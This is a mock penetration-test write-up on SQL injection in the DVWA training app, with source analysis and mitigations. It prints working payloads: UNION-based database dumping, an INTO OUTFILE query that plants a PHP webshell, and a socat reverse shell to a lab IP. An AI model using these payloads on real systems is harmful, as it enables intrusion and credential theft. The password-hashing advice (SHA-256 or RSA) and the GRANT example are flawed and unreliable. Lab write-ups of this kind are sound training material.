# SQL Injection Remote Code Execution Report

## Table of Contents
- [**Outline**](#section-0)
- [**Vulnerability Explanation**](#section-1)
- [ **Proof of Concept - Establishing a  Reverse Shell**](#section-2)
- [ **Source Code Analysis**](#section-3)
- [**Mitigating SQL Injection Vulnerability**](#section-4)

## Outline {#section-0}
The goal of this write-up is to document and demonstrate SQL Injection vulnerability against the Damn Vulnerable Web Application (DVWA). The objective of this attack was to gain a Remote Code Execution (RCE) as `www-data`. This report mocks a penetration testing report and a debriefing situation for a client. 

## Vulnerability Explanation {#section-1}

![](/assets/sql/real.png)  

| Information | Explanation                            |
|-------------|----------------------------------------|
| Name        | SQLi                                   |
| Severity    | High                                   |
| CVSS        | 8.8                                    |
| String      | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H    |
| Path        | http://127.0.0.1/vulnerabilities/sqli/ |


SQL injection is a security vulnerability that allows attackers to manipulate SQL queries executed by a web application's database.  This vulnerability poses a significant threat to the Confidentiality, Integrity, and Availability (CIA) triad of a system, as it can result in data breaches, unauthorized data disclosure, data manipulation,  and potential system downtime. It may also lead to a full compromise of a system through Remote Code Execution. 


## Proof of Concept {#section-2}

First, the tester manually detected a SQL injection vulnerability by submitting the single quote character `'` 
![](/assets/sql/ERROR.png)  
The tester found an error, which signified a very likely SQL injection vulnerability.
To conduct a more sophisticated `UNION` based attack, the tester proceeded to test out the number of columns that were returned from the original query.
The `UNION` keyword lets the tester execute one or more additional `SELECT` queries and append the results to the original query. This is useful as the tester could include
additional database information and queries of his taste.
```bash
' ORDER BY 1#
' ORDER BY 2#
```
After some trial and error, the tester confirmed that there were two columns from the original query.

![](/assets/sql/column2.png)

With the columns in mind, the tester crafted the following payload to write a PHP webshell payload into the `/var/www/html/tmp/` directory.

```bash
' UNION SELECT null, "<?php system($_GET['cmd']);?>"INTO OUTFILE "/var/www/html/tmp/shell1.php" #
``` 

To establish a reverse shell, the tester utilized the following socat command.
```bash
 socat tcp-connect:192.168.45.180:1234 exec:bash 
``` 
For the server to correctly interpret and transmit the reverse shell, the URL was encoded as the following:
```bash
socat%20tcp-connect%3A192.168.45.180%3A1234%20exec%3Abash
```   
The tester created a  net cat listener to catch  the reverse shell. 
```bash
nc -nlvp 1234 
``` 

Next, the encoded URL was appended to `/tmp/shell1.php` with the `cmd` parameter as the following. 

```bash
127.0.0.1/tmp/shell1.php?cmd=socat%20tcp-connect%3A192.168.45.180%3A1234exec%3Abash
 ```

 The tester gained an interactive reverse shell as demonstrated below.
![](/assets/sql/REV.gif)  

If the current user does not have sufficient privilege to conduct the `INTO OUTFILE` SQL query,  there were other methods to retrieve sensitive data.
With the below command, the tester queried all available databases.
```bash
' union SELECT null, schema_name FROM information_schema.schemata #
```
![](/assets/sql/dataBases.png)  

Next, the tester targeted the table names from the dvwa database to figure out that there was a users table to target.
```bash
' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'dvwa' #
```
![](/assets/sql/table_name.png)  

Next, the tester figured out  the column names from the dvwa users table.

```bash
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users' #
```
As a result, the tester retrieved the username and password from the data base.

```bash
' UNION SELECT user, password FROM dvwa.users #

```
![](/assets/sql/extract.png) 
The tester utilized hash-identifier to identify the hash as md5.
![](/assets/sql/hash-identifier.png) 
Finally, the tester utilzed hashcat to crack the password and identified the admin password as `password`

![](/assets/sql/cracked.png) 


## Source Code Analysis {#section-3}
### Security-Low-Level
In the `Security-Low-Level module`, there are zero security measures in place to limit user input.
```bash
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?> 
```
The user input is stored in the variable `$id` using the $_REQUEST['id'] mechanism. Subsequently, the query is executed, retrieving the first_name and last_name fields from the users table based on the provided user ID.  \
` $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`
 However, this code snippet is susceptible to SQL injection attacks because it does not properly validate or sanitize the user input. This means that an attacker can exploit the vulnerability by inputting malicious SQL queries into the id field, potentially compromising the security and integrity of the database. To mitigate this risk, it is crucial to implement proper input validation and parameterization techniques to prevent SQL injection vulnerabilities.

### Security-Medium-Level
In the `Security-Medium-Level module`, there are minimal security measures to validate user upload. 
```php
if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
....
}
```
The user input field was replaced by a dropdown list as a preventive measure to mitigate the risk of SQL injection attacks. Additionally, the `mysqli_real_escape_string()` function was employed to escape special characters in the input string, such as single quotes, double quotes, and backslashes, before using it in an SQL query.

However, despite these precautions, the prevention mechanism proved to be ineffective when tested using Burpsuite. By intercepting the user input and injecting the `UNION SELECT user, password FROM dvwa.users #` statement, the tester successfully retrieved information from the database. This was possible because the tester exploited the functionality of the SQL UNION query, bypassing the protective measures of `mysqli_real_escape_string()`.

Furthermore, the dropdown list approach also demonstrated vulnerabilities as the parameters were manipulatable using Burp suite, undermining the intended security measures.


### Security-High-Level
```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; 
....
}
```

In the `Security-High-Level module`, an additional security measure has been implemented by adding a `LIMIT 1;` statement to the SQL query after the `user_id = '$id'` condition. This measure aims to restrict the output of the SQL database to only one record, thereby mitigating the impact of sophisticated attacks such as the UNION-based attack.

However,  the tester bypassed this prevention method by simply appending the comment symbol, which effectively commented out the `LIMIT 1;` statement. By employing the same payload as used in the `Security-Medium-Level module`, the tester exploited the vulnerability and gained unauthorized access to sensitive data.

## Mitigating SQL Injection Vulnerability {#section-4}  
### Use Parameterized Queries
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->bindParam(':username', $username);
$stmt->bindParam(':password', $password);
$stmt->execute();
```
 Bind  input values from the SQL code and ensures that they are treated as data rather than executable SQL statements. When a value is binded, it is securely passed to the database engine as a parameter, and the databasee interpreted the parameter as non sql data to be used in the query. Here the `:username` and `:password` are binded to the parameter `$username` and `$password` respectively.

### Principle of Least Privilege

Ensure that database users have the minimum required privileges necessary for their operations. Avoid granting excessive permissions to user accounts.
```bash
mysql -u root -p root
GRANT SELECT, INSERT, UPDATE, DELETE, ON mydatabase.* TO 'app'@'localhost';
FLUSH PRIVILEGES;
```
By excluding the `EXECUTE` privilege, the system restrict the user from executing stored procedures . Moreover, by removing the `INTO OUTFILE`, the system prevents users from writing query results directly to an output file on the server's file system. This would have prevented the Remote Code Execution demonstrated in the start of the report.

### Password Hashing: 
Use strong cryptographic hash functions like SHA-256 or using asymmetric encryption algorithms like RSA to hash passwords. This provide an additional layer of security for storing passwords. MD5 is outdated.

## Conclusion
In conclusion, SQL injection is a critical vulnerability that poses significant risks to the security and integrity of database. It enables attackers to manipulate SQL queries and potentially gain unauthorized access, disclose sensitive information, or even execute arbitrary code. Preventing SQL injection is of prime importance to protect the confidentiality, integrity, and availability of data for users.

### Reference: 
[GrootBoan](https://security.grootboan.com/) , and
[Portswigger](https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection) 